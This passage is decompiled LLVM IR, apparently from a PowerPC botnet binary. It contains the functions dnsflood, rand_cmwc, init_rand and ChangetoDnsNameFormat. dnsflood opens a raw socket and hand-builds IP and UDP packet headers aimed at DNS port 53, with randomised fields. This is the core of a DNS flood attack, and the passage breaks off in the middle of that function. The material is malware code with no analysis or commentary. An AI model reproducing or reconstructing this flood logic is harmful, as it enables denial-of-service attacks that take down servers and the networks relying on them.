  %v1_10001ec4 = add i32 %v1_10001e7c, 16
  %v2_10001ec4 = inttoptr i32 %v1_10001ec4 to i32*
  %v3_10001ec4 = load i32, i32* %v2_10001ec4, align 4
  %v1_10001ec8 = inttoptr i32 %v3_10001ec4 to i32*
  %v2_10001ec8 = load i32, i32* %v1_10001ec8, align 4
  %v1_10001ed8 = add i32 %v1_10001e7c, 12
  %v2_10001ed8 = inttoptr i32 %v1_10001ed8 to i32*
  %v3_10001ed8 = load i32, i32* %v2_10001ed8, align 4
  store i32 %v3_10001ed8, i32* @r5, align 4
  store i32 268443372, i32* @lr, align 4
  %v4_10001ee8 = call i32 @bcopy(i32 %v2_10001ec8, i32 ptrtoint (i32* @global_var_10045160.91 to i32), i32 %v3_10001ed8, i32 %v1_10001e7c)
  %v3_10001ef0.pre = load i32, i32* @global_var_10045160.91, align 4
  br label %dec_label_pc_10001eec

dec_label_pc_10001eec:                            ; preds = %entry, %dec_label_pc_10001ec0
  %v3_10001ef0 = phi i32 [ %v1_10001e54, %entry ], [ %v3_10001ef0.pre, %dec_label_pc_10001ec0 ]
  ret i32 %v3_10001ef0

; uselistorder directives
  uselistorder i32 %v3_10001ed8, { 1, 0 }
  uselistorder i32 %v1_10001e7c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001eec, { 1, 0 }
  uselistorder label %dec_label_pc_10001ec0, { 1, 0 }
}

define i32 @ChangetoDnsNameFormat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  %v0_10001f40 = call i32 @__GI_strlen()
  %v2_10001f48 = add i32 %v0_10001f40, %arg2
  %v3_10001f54 = inttoptr i32 %v2_10001f48 to i16*
  store i16 11776, i16* %v3_10001f54, align 2
  store i32 %arg2, i32* @r3, align 4
  %v0_1000202010 = call i32 @__GI_strlen()
  %v2_1000202812 = icmp eq i32 %v0_1000202010, 0
  br i1 %v2_1000202812, label %dec_label_pc_10002030, label %dec_label_pc_10001f64

dec_label_pc_10001f64:                            ; preds = %entry, %dec_label_pc_10002008
  %storemerge117 = phi i32 [ %v1_1000200c, %dec_label_pc_10002008 ], [ 0, %entry ]
  %stack_var_-24.216 = phi i8* [ %stack_var_-24.1, %dec_label_pc_10002008 ], [ %arg1, %entry ]
  %stack_var_-36.215 = phi i32 [ %stack_var_-36.1, %dec_label_pc_10002008 ], [ 0, %entry ]
  %v2_10001f70 = add i32 %storemerge117, %arg2
  %v1_10001f74 = inttoptr i32 %v2_10001f70 to i8*
  %v2_10001f74 = load i8, i8* %v1_10001f74, align 1
  %v3_10001f7c = icmp eq i8 %v2_10001f74, 46
  br i1 %v3_10001f7c, label %dec_label_pc_10001f84, label %dec_label_pc_10002008

dec_label_pc_10001f84:                            ; preds = %dec_label_pc_10001f64
  %fold = sub i32 %storemerge117, %stack_var_-36.215
  %v4_10001f9c = ptrtoint i8* %stack_var_-24.216 to i32
  %v1_10001fa0 = trunc i32 %fold to i8
  store i8 %v1_10001fa0, i8* %stack_var_-24.216, align 1
  %v1_10001fa8 = add i32 %v4_10001f9c, 1
  %stack_var_-24.02 = inttoptr i32 %v1_10001fa8 to i8*
  %v2_10001ff43 = icmp sgt i32 %storemerge117, %stack_var_-36.215
  br i1 %v2_10001ff43, label %dec_label_pc_10001fb4, label %dec_label_pc_10001ffc

dec_label_pc_10001fb4:                            ; preds = %dec_label_pc_10001f84, %dec_label_pc_10001fb4
  %stack_var_-24.08 = phi i8* [ %stack_var_-24.0, %dec_label_pc_10001fb4 ], [ %stack_var_-24.02, %dec_label_pc_10001f84 ]
  %stack_var_-24.0.in7 = phi i32 [ %v1_10001fd8, %dec_label_pc_10001fb4 ], [ %v1_10001fa8, %dec_label_pc_10001f84 ]
  %stack_var_-36.06 = phi i32 [ %v1_10001fe4, %dec_label_pc_10001fb4 ], [ %stack_var_-36.215, %dec_label_pc_10001f84 ]
  %v2_10001fc0 = add i32 %stack_var_-36.06, %arg2
  %v1_10001fc4 = inttoptr i32 %v2_10001fc0 to i8*
  %v2_10001fc4 = load i8, i8* %v1_10001fc4, align 1
  store i8 %v2_10001fc4, i8* %stack_var_-24.08, align 1
  %v1_10001fd8 = add i32 %stack_var_-24.0.in7, 1
  %v1_10001fe4 = add nsw i32 %stack_var_-36.06, 1
  %stack_var_-24.0 = inttoptr i32 %v1_10001fd8 to i8*
  %v2_10001ff4 = icmp slt i32 %v1_10001fe4, %storemerge117
  br i1 %v2_10001ff4, label %dec_label_pc_10001fb4, label %dec_label_pc_10001ffc

dec_label_pc_10001ffc:                            ; preds = %dec_label_pc_10001fb4, %dec_label_pc_10001f84
  %stack_var_-36.0.lcssa = phi i32 [ %stack_var_-36.215, %dec_label_pc_10001f84 ], [ %storemerge117, %dec_label_pc_10001fb4 ]
  %stack_var_-24.0.lcssa = phi i8* [ %stack_var_-24.02, %dec_label_pc_10001f84 ], [ %stack_var_-24.0, %dec_label_pc_10001fb4 ]
  %v1_10002000 = add i32 %stack_var_-36.0.lcssa, 1
  br label %dec_label_pc_10002008

dec_label_pc_10002008:                            ; preds = %dec_label_pc_10001f64, %dec_label_pc_10001ffc
  %stack_var_-36.1 = phi i32 [ %v1_10002000, %dec_label_pc_10001ffc ], [ %stack_var_-36.215, %dec_label_pc_10001f64 ]
  %stack_var_-24.1 = phi i8* [ %stack_var_-24.0.lcssa, %dec_label_pc_10001ffc ], [ %stack_var_-24.216, %dec_label_pc_10001f64 ]
  %v1_1000200c = add i32 %storemerge117, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_10002020 = call i32 @__GI_strlen()
  %v2_10002028 = icmp ult i32 %v1_1000200c, %v0_10002020
  br i1 %v2_10002028, label %dec_label_pc_10001f64, label %dec_label_pc_10002030

dec_label_pc_10002030:                            ; preds = %entry, %dec_label_pc_10002008
  %stack_var_-24.2.lcssa = phi i8* [ %arg1, %entry ], [ %stack_var_-24.1, %dec_label_pc_10002008 ]
  %v0_10002020.lcssa = phi i32 [ %v0_1000202010, %entry ], [ %v0_10002020, %dec_label_pc_10002008 ]
  store i8 0, i8* %stack_var_-24.2.lcssa, align 1
  ret i32 %v0_10002020.lcssa

; uselistorder directives
  uselistorder i32 %v1_10001fe4, { 1, 0 }
  uselistorder i32 %v1_10001fd8, { 1, 0 }
  uselistorder i32 %stack_var_-36.06, { 1, 0 }
  uselistorder i8* %stack_var_-24.02, { 1, 0 }
  uselistorder i32 %stack_var_-36.215, { 4, 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24.216, { 2, 0, 1 }
  uselistorder i32 %storemerge117, { 5, 0, 4, 2, 3, 1 }
  uselistorder i32 %v0_1000202010, { 1, 0 }
  uselistorder i32 %arg2, { 4, 1, 2, 3, 0, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002030, { 1, 0 }
  uselistorder label %dec_label_pc_10002008, { 1, 0 }
  uselistorder label %dec_label_pc_10001fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10001f64, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_100456b4.94, align 4
  %v1_1000208c = add i32 %arg1, -1640531527
  store i32 %v1_1000208c, i32* @global_var_100456b8.95, align 4
  %v1_100020a4 = add i32 %arg1, 1013904242
  store i32 %v1_100020a4, i32* @global_var_100456bc.96, align 4
  br label %dec_label_pc_100020c0

dec_label_pc_100020c0:                            ; preds = %entry, %dec_label_pc_100020c0
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_10002128, %dec_label_pc_100020c0 ]
  %v1_100020c8 = mul i32 %storemerge12, 4
  %v2_100020d8 = add i32 %v1_100020c8, add (i32 ptrtoint (i32* @global_var_100456b4.94 to i32), i32 -12)
  %v1_100020dc = inttoptr i32 %v2_100020d8 to i32*
  %v2_100020dc = load i32, i32* %v1_100020dc, align 4
  %v2_100020f4 = add i32 %v1_100020c8, add (i32 ptrtoint (i32* @global_var_100456b4.94 to i32), i32 -8)
  %v1_100020f8 = inttoptr i32 %v2_100020f4 to i32*
  %v2_100020f8 = load i32, i32* %v1_100020f8, align 4
  %v2_100020fc = xor i32 %storemerge12, -1640531527
  %v2_10002104 = xor i32 %v2_100020fc, %v2_100020dc
  %v1_1000210c = xor i32 %v2_10002104, %v2_100020f8
  %v2_1000211c = add i32 %v1_100020c8, ptrtoint (i32* @global_var_100456b4.94 to i32)
  %v2_10002120 = inttoptr i32 %v2_1000211c to i32*
  store i32 %v1_1000210c, i32* %v2_10002120, align 4
  %v1_10002128 = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_10002128, 4096
  br i1 %tmp7, label %dec_label_pc_100020c0, label %dec_label_pc_1000213c

dec_label_pc_1000213c:                            ; preds = %dec_label_pc_100020c0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_100020c8, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100020c0, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v3_10002174 = load i32, i32* @global_var_10040738.97, align 4
  %v1_10002178 = add i32 %v3_10002174, 1
  %v1_1000217c = urem i32 %v1_10002178, 4096
  store i32 %v1_1000217c, i32* @global_var_10040738.97, align 4
  %v1_10002198 = mul nuw nsw i32 %v1_1000217c, 4
  %v2_1000219c = add i32 %v1_10002198, ptrtoint (i32* @global_var_100456b4.94 to i32)
  %v1_100021a0 = inttoptr i32 %v2_1000219c to i32*
  %v2_100021a0 = load i32, i32* %v1_100021a0, align 4
  %v6_100021c4 = udiv i32 %v2_100021a0, 228675
  %v2_100021c8 = mul i32 %v2_100021a0, 18782
  store i32 %v6_100021c4, i32* @r8, align 4
  %v3_100021d8 = load i32, i32* @global_var_10040734.98, align 4
  %v2_100021e4 = add i32 %v3_100021d8, %v2_100021c8
  %v3_100021e4 = icmp ult i32 %v2_100021e4, %v3_100021d8
  %v4_100021e8 = zext i1 %v3_100021e4 to i32
  %v5_100021e8 = add nuw nsw i32 %v4_100021e8, %v6_100021c4
  %v2_10002218 = add i32 %v5_100021e8, %v2_100021e4
  %v2_1000222c = icmp ult i32 %v2_10002218, %v5_100021e8
  br i1 %v2_1000222c, label %dec_label_pc_10002234, label %dec_label_pc_10002254

dec_label_pc_10002234:                            ; preds = %entry
  %v1_10002238 = add i32 %v2_10002218, 1
  %v1_10002248 = add nuw nsw i32 %v5_100021e8, 1
  br label %dec_label_pc_10002254

dec_label_pc_10002254:                            ; preds = %entry, %dec_label_pc_10002234
  %storemerge = phi i32 [ %v1_10002248, %dec_label_pc_10002234 ], [ %v5_100021e8, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_10002238, %dec_label_pc_10002234 ], [ %v2_10002218, %entry ]
  store i32 %storemerge, i32* @global_var_10040734.98, align 4
  store i32 %v1_1000217c, i32* @r10, align 4
  %v2_10002264 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10002264, i32* %v1_100021a0, align 4
  %v0_10002284 = load i32, i32* @r10, align 4
  %v1_10002284 = mul i32 %v0_10002284, 4
  %v2_10002288 = add i32 %v1_10002284, ptrtoint (i32* @global_var_100456b4.94 to i32)
  %v1_1000228c = inttoptr i32 %v2_10002288 to i32*
  %v2_1000228c = load i32, i32* %v1_1000228c, align 4
  ret i32 %v2_1000228c

; uselistorder directives
  uselistorder i32 %v5_100021e8, { 0, 2, 3, 1 }
  uselistorder i32 %v3_100021d8, { 1, 0 }
  uselistorder i32 %v6_100021c4, { 1, 0 }
  uselistorder i32 %v2_100021a0, { 1, 0 }
  uselistorder i32 %v1_1000217c, { 2, 0, 1 }
  uselistorder i32* @global_var_100456b4.94, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100456b4.94 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10002254, { 1, 0 }
}

define i32 @myStrCat(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100022cc11 = load i8, i8* %arg1, align 1
  %v3_100022d414 = icmp eq i8 %v2_100022cc11, 0
  br i1 %v3_100022d414, label %dec_label_pc_1000230c.preheader, label %dec_label_pc_100022bc

dec_label_pc_100022bc:                            ; preds = %entry, %dec_label_pc_100022bc
  %v4_100022c815 = phi i32 [ %v1_100022c0, %dec_label_pc_100022bc ], [ %tmp, %entry ]
  %v1_100022c0 = add i32 %v4_100022c815, 1
  %v5_100022c4 = inttoptr i32 %v1_100022c0 to i8*
  %v2_100022cc = load i8, i8* %v5_100022c4, align 1
  %v3_100022d4 = icmp eq i8 %v2_100022cc, 0
  br i1 %v3_100022d4, label %dec_label_pc_1000230c.preheader, label %dec_label_pc_100022bc

dec_label_pc_1000230c.preheader:                  ; preds = %dec_label_pc_100022bc, %entry
  %stack_var_-24.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_100022c4, %dec_label_pc_100022bc ]
  %stack_var_-20.02 = inttoptr i32 %arg2 to i8*
  %v2_100023103 = load i8, i8* %stack_var_-20.02, align 1
  %v3_100023186 = icmp eq i8 %v2_100023103, 0
  br i1 %v3_100023186, label %dec_label_pc_10002320, label %dec_label_pc_100022e0

dec_label_pc_100022e0:                            ; preds = %dec_label_pc_1000230c.preheader, %dec_label_pc_100022e0
  %stack_var_-20.09 = phi i8* [ %stack_var_-20.0, %dec_label_pc_100022e0 ], [ %stack_var_-20.02, %dec_label_pc_1000230c.preheader ]
  %stack_var_-24.18 = phi i8* [ %v5_100022fc, %dec_label_pc_100022e0 ], [ %stack_var_-24.0.lcssa, %dec_label_pc_1000230c.preheader ]
  %stack_var_-20.0.in7 = phi i32 [ %v1_10002304, %dec_label_pc_100022e0 ], [ %arg2, %dec_label_pc_1000230c.preheader ]
  %v2_100022e4 = load i8, i8* %stack_var_-20.09, align 1
  %v4_100022ec = ptrtoint i8* %stack_var_-24.18 to i32
  store i8 %v2_100022e4, i8* %stack_var_-24.18, align 1
  %v1_100022f8 = add i32 %v4_100022ec, 1
  %v5_100022fc = inttoptr i32 %v1_100022f8 to i8*
  %v1_10002304 = add i32 %stack_var_-20.0.in7, 1
  %stack_var_-20.0 = inttoptr i32 %v1_10002304 to i8*
  %v2_10002310 = load i8, i8* %stack_var_-20.0, align 1
  %v3_10002318 = icmp eq i8 %v2_10002310, 0
  br i1 %v3_10002318, label %dec_label_pc_10002320, label %dec_label_pc_100022e0

dec_label_pc_10002320:                            ; preds = %dec_label_pc_100022e0, %dec_label_pc_1000230c.preheader
  %stack_var_-24.1.lcssa = phi i8* [ %stack_var_-24.0.lcssa, %dec_label_pc_1000230c.preheader ], [ %v5_100022fc, %dec_label_pc_100022e0 ]
  %v4_10002320 = ptrtoint i8* %stack_var_-24.1.lcssa to i32
  store i8 0, i8* %stack_var_-24.1.lcssa, align 1
  ret i32 %v4_10002320

; uselistorder directives
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v1_10002304, { 1, 0 }
  uselistorder i8* %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100022c0, { 1, 0 }
  uselistorder label %dec_label_pc_100022e0, { 1, 0 }
  uselistorder label %dec_label_pc_100022bc, { 1, 0 }
}

define i32 @replStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10002364 = icmp eq i32 %arg2, 0
  br i1 %v3_10002364, label %dec_label_pc_1000236c, label %dec_label_pc_10002378

dec_label_pc_1000236c:                            ; preds = %entry
  br label %dec_label_pc_10002414

dec_label_pc_10002378:                            ; preds = %entry
  store i32 %arg1, i32* @r3, align 4
  %v0_1000237c = call i32 @__GI_strlen()
  %v2_10002388 = mul i32 %v0_1000237c, %arg2
  %v2_10002390 = add i32 %v2_10002388, %arg2
  store i32 %v2_10002390, i32* @r3, align 4
  store i32 268444572, i32* @lr, align 4
  %v0_10002398 = call i32 @malloc()
  %v3_100023a8 = icmp eq i32 %v0_10002398, 0
  br i1 %v3_100023a8, label %dec_label_pc_100023b0, label %dec_label_pc_100023bc

dec_label_pc_100023b0:                            ; preds = %dec_label_pc_10002378
  br label %dec_label_pc_10002414

dec_label_pc_100023bc:                            ; preds = %dec_label_pc_10002378
  %v4_100023bc = inttoptr i32 %v0_10002398 to i8*
  store i8 0, i8* %v4_100023bc, align 1
  %v5_100023d0 = call i32 @myStrCat(i8* %v4_100023bc, i32 %arg1, i32 %v0_10002398)
  %v1_100023f83 = add i32 %arg2, -1
  %v3_100024046 = icmp eq i32 %v1_100023f83, 0
  br i1 %v3_100024046, label %dec_label_pc_1000240c, label %dec_label_pc_100023e0

dec_label_pc_100023e0:                            ; preds = %dec_label_pc_100023bc, %dec_label_pc_100023e0
  %stack_var_-20.07 = phi i32 [ %v1_100023f89, %dec_label_pc_100023e0 ], [ %arg2, %dec_label_pc_100023bc ]
  %v1_100023f89 = phi i32 [ %v1_100023f8, %dec_label_pc_100023e0 ], [ %v1_100023f83, %dec_label_pc_100023bc ]
  %storemerge28 = phi i32 [ %v4_100023e8, %dec_label_pc_100023e0 ], [ %v5_100023d0, %dec_label_pc_100023bc ]
  %v3_100023e8 = inttoptr i32 %storemerge28 to i8*
  %v4_100023e8 = call i32 @myStrCat(i8* %v3_100023e8, i32 %arg1, i32 %stack_var_-20.07)
  %v1_100023f8 = add i32 %v1_100023f89, -1
  %v3_10002404 = icmp eq i32 %v1_100023f8, 0
  br i1 %v3_10002404, label %dec_label_pc_1000240c, label %dec_label_pc_100023e0

dec_label_pc_1000240c:                            ; preds = %dec_label_pc_100023e0, %dec_label_pc_100023bc
  br label %dec_label_pc_10002414

dec_label_pc_10002414:                            ; preds = %dec_label_pc_100023b0, %dec_label_pc_1000236c, %dec_label_pc_1000240c
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_1000236c ], [ 0, %dec_label_pc_100023b0 ], [ %v0_10002398, %dec_label_pc_1000240c ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v1_100023f8, { 1, 0 }
  uselistorder i32 %v1_100023f89, { 1, 0 }
  uselistorder i32 %v0_10002398, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10002414, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100023e0, { 1, 0 }
}

define i32 @setup_udp_header(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @dnsflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-4744 = alloca i16*, align 4
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-4692 = alloca i32, align 4
  store i32 268444784, i32* @lr, align 4
  %v0_1000246c = call i32 @listFork()
  %v3_10002474 = icmp eq i32 %v0_1000246c, 0
  br i1 %v3_10002474, label %dec_label_pc_1000247c, label %dec_label_pc_10002ba0

dec_label_pc_1000247c:                            ; preds = %entry
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10002494 = add i32 %arg1, 12
  %v2_10002494 = inttoptr i32 %v1_10002494 to i32*
  %v3_10002494 = load i32, i32* %v2_10002494, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100024b4 = add i32 %arg1, 4
  %v2_100024b4 = inttoptr i32 %v1_100024b4 to i32*
  %v3_100024b4 = load i32, i32* %v2_100024b4, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100024c0 = add i32 %arg1, 24
  %v2_100024c0 = inttoptr i32 %v1_100024c0 to i32*
  %v3_100024c0 = load i32, i32* %v2_100024c0, align 4
  store i32 268444888, i32* @lr, align 4
  %v3_100024d4 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp50 = icmp sgt i32 %v3_100024d4, -1
  br i1 %tmp50, label %dec_label_pc_100024f4, label %dec_label_pc_100024ec

dec_label_pc_100024ec:                            ; preds = %dec_label_pc_1000247c
  %v0_100024f0 = call i32 @__GI_exit()
  br label %dec_label_pc_100024f4

dec_label_pc_100024f4:                            ; preds = %dec_label_pc_1000247c, %dec_label_pc_100024ec
  store i32 268444924, i32* @lr, align 4
  %v1_100024f8 = call i32 @__GI_time(i32 0)
  %v1_10002504 = call i32 @init_rand(i32 %v1_100024f8)
  %v2_10002508 = ptrtoint i32* %stack_var_-4692 to i32
  store i32 4096, i32* %r9.global-to-local, align 4
  store i32 %v2_10002508, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268444960, i32* @lr, align 4
  %v0_1000251c = call i32 @__GI_memset()
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10002534 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002534, i32* %stack_var_-4692, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10002548 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002548, i32* %stack_var_-4692, align 4
  %v3_10002558 = or i32 %v2_10002508, 1
  %v4_10002558 = inttoptr i32 %v3_10002558 to i8*
  store i8 0, i8* %v4_10002558, align 1
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_10002564 = or i32 %v2_10002508, 2
  %v4_10002564 = inttoptr i32 %v3_10002564 to i16*
  store i16 58, i16* %v4_10002564, align 2
  store i32 54321, i32* @r3, align 4
  %v1_10002570 = call i32 @htonl(i32 54321)
  %v1_10002580 = trunc i32 %v1_10002570 to i16
  %v3_10002580 = add i32 %v2_10002508, 4
  %v4_10002580 = inttoptr i32 %v3_10002580 to i16*
  store i16 %v1_10002580, i16* %v4_10002580, align 4
  %v3_1000258c = add i32 %v2_10002508, 6
  %v4_1000258c = inttoptr i32 %v3_1000258c to i16*
  store i16 0, i16* %v4_1000258c, align 2
  %v3_10002598 = add i32 %v2_10002508, 8
  %v4_10002598 = inttoptr i32 %v3_10002598 to i8*
  store i8 -1, i8* %v4_10002598, align 4
  %v3_100025a4 = add i32 %v2_10002508, 9
  %v4_100025a4 = inttoptr i32 %v3_100025a4 to i8*
  store i8 17, i8* %v4_100025a4, align 1
  %v3_100025b0 = add i32 %v2_10002508, 10
  %v4_100025b0 = inttoptr i32 %v3_100025b0 to i16*
  store i16 0, i16* %v4_100025b0, align 2
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268445120, i32* @lr, align 4
  %v2_100025bc = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_1002a5b8.100 to i32))
  %v2_100025c8 = add i32 %v2_10002508, 12
  %v3_100025c8 = inttoptr i32 %v2_100025c8 to i32*
  store i32 %v2_100025bc, i32* %v3_100025c8, align 4
  store i32 20, i32* %r9.global-to-local, align 4
  %v2_100025e4 = add i32 %v2_10002508, 20
  %v5_100025e8 = inttoptr i32 %v2_100025e4 to i16*
  %v1_100025f0 = urem i32 %v3_100024c0, 65536
  store i32 %v1_100025f0, i32* @r3, align 4
  %v1_100025f8 = call i32 @htons(i32 %v1_100025f0)
  %sext = mul i32 %v1_100025f8, 65536
  %v1_100025fc = sdiv i32 %sext, 65536
  store i32 %v2_100025e4, i32* %r9.global-to-local, align 4
  %v1_10002604 = trunc i32 %v1_100025fc to i16
  store i16 %v1_10002604, i16* %v5_100025e8, align 4
  store i32 53, i32* @r3, align 4
  %v1_1000260c = call i32 @htons(i32 53)
  %v1_10002618 = trunc i32 %v1_1000260c to i16
  %v3_10002618 = add i32 %v2_10002508, 22
  %v4_10002618 = inttoptr i32 %v3_10002618 to i16*
  store i16 %v1_10002618, i16* %v4_10002618, align 2
  %v3_10002624 = add i32 %v2_10002508, 26
  %v4_10002624 = inttoptr i32 %v3_10002624 to i16*
  store i16 0, i16* %v4_10002624, align 2
  store i32 28, i32* %r9.global-to-local, align 4
  %v2_10002640 = add i32 %v2_10002508, 28
  %v5_10002644 = inttoptr i32 %v2_10002640 to i16*
  %v0_10002648 = call i32 @rand_cmwc()
  %v1_10002650 = urem i32 %v0_10002648, 65536
  store i32 %v1_10002650, i32* @r3, align 4
  %v1_10002658 = call i32 @htons(i32 %v1_10002650)
  %sext5 = mul i32 %v1_10002658, 65536
  %v1_1000265c = sdiv i32 %sext5, 65536
  %v1_10002664 = trunc i32 %v1_1000265c to i16
  store i16 %v1_10002664, i16* %v5_10002644, align 4
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v1_1000266c = add i32 %v2_10002508, 30
  %v2_1000266c = inttoptr i32 %v1_1000266c to i16*
  %v3_1000266c = load i16, i16* %v2_1000266c, align 2
  %v4_1000266c = zext i16 %v3_1000266c to i32
  %v1_10002670 = call i32 @__asm_rlwinm(i32 %v4_1000266c, i32 0, i32 24, i32 22)
  %v2_10002670 = trunc i32 %v1_10002670 to i16
  %v3_10002674 = load i32, i32* %r9.global-to-local, align 4
  %v4_10002674 = add i32 %v3_10002674, 2
  %v5_10002674 = inttoptr i32 %v4_10002674 to i16*
  store i16 %v2_10002670, i16* %v5_10002674, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_1000267c = load i16, i16* %v2_1000266c, align 2
  %v1_10002688 = sext i16 %v3_1000267c to i32
  %v2_10002688 = call i32 @__asm_rlwinm(i32 %v1_10002688, i32 0, i32 23, i32 18)
  %v1_10002694 = trunc i32 %v2_10002688 to i16
  %v2_10002694 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002694 = add i32 %v2_10002694, 2
  %v4_10002694 = inttoptr i32 %v3_10002694 to i16*
  store i16 %v1_10002694, i16* %v4_10002694, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_1000269c = load i16, i16* %v2_1000266c, align 2
  %v4_1000269c = zext i16 %v3_1000269c to i32
  %v1_100026a0 = call i32 @__asm_rlwinm(i32 %v4_1000269c, i32 0, i32 19, i32 17)
  %v2_100026a0 = trunc i32 %v1_100026a0 to i16
  %v3_100026a4 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026a4 = add i32 %v3_100026a4, 2
  %v5_100026a4 = inttoptr i32 %v4_100026a4 to i16*
  store i16 %v2_100026a0, i16* %v5_100026a4, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026ac = load i16, i16* %v2_1000266c, align 2
  %v4_100026ac = zext i16 %v3_100026ac to i32
  %v1_100026b0 = call i32 @__asm_rlwinm(i32 %v4_100026ac, i32 0, i32 18, i32 16)
  %v2_100026b0 = trunc i32 %v1_100026b0 to i16
  %v3_100026b4 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026b4 = add i32 %v3_100026b4, 2
  %v5_100026b4 = inttoptr i32 %v4_100026b4 to i16*
  store i16 %v2_100026b0, i16* %v5_100026b4, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026bc = load i16, i16* %v2_1000266c, align 2
  %v1_100026c4 = or i16 %v3_100026bc, -32768
  store i16 %v1_100026c4, i16* %v2_1000266c, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026d0 = load i16, i16* %v2_1000266c, align 2
  %v4_100026d0 = zext i16 %v3_100026d0 to i32
  %v1_100026d4 = call i32 @__asm_rlwinm(i32 %v4_100026d0, i32 0, i32 0, i32 30)
  %v2_100026d4 = trunc i32 %v1_100026d4 to i16
  %v3_100026d8 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026d8 = add i32 %v3_100026d8, 2
  %v5_100026d8 = inttoptr i32 %v4_100026d8 to i16*
  store i16 %v2_100026d4, i16* %v5_100026d8, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026e0 = load i16, i16* %v2_1000266c, align 2
  %v4_100026e0 = zext i16 %v3_100026e0 to i32
  %v1_100026e4 = call i32 @__asm_rlwinm(i32 %v4_100026e0, i32 0, i32 31, i32 29)
  %v2_100026e4 = trunc i32 %v1_100026e4 to i16
  %v3_100026e8 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026e8 = add i32 %v3_100026e8, 2
  %v5_100026e8 = inttoptr i32 %v4_100026e8 to i16*
  store i16 %v2_100026e4, i16* %v5_100026e8, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026f0 = load i16, i16* %v2_1000266c, align 2
  %v4_100026f0 = zext i16 %v3_100026f0 to i32
  %v1_100026f4 = call i32 @__asm_rlwinm(i32 %v4_100026f0, i32 0, i32 30, i32 28)
  %v2_100026f4 = trunc i32 %v1_100026f4 to i16
  %v3_100026f8 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026f8 = add i32 %v3_100026f8, 2
  %v5_100026f8 = inttoptr i32 %v4_100026f8 to i16*
  store i16 %v2_100026f4, i16* %v5_100026f8, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_10002700 = load i16, i16* %v2_1000266c, align 2
  %v4_10002700 = zext i16 %v3_10002700 to i32
  %v1_10002704 = call i32 @__asm_rlwinm(i32 %v4_10002700, i32 0, i32 29, i32 27)
  %v2_10002704 = trunc i32 %v1_10002704 to i16
  %v3_10002708 = load i32, i32* %r9.global-to-local, align 4
  %v4_10002708 = add i32 %v3_10002708, 2
  %v5_10002708 = inttoptr i32 %v4_10002708 to i16*
  store i16 %v2_10002704, i16* %v5_10002708, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_10002710 = load i16, i16* %v2_1000266c, align 2
  %v1_1000271c = sext i16 %v3_10002710 to i32
  %v2_1000271c = call i32 @__asm_rlwinm(i32 %v1_1000271c, i32 0, i32 28, i32 23)
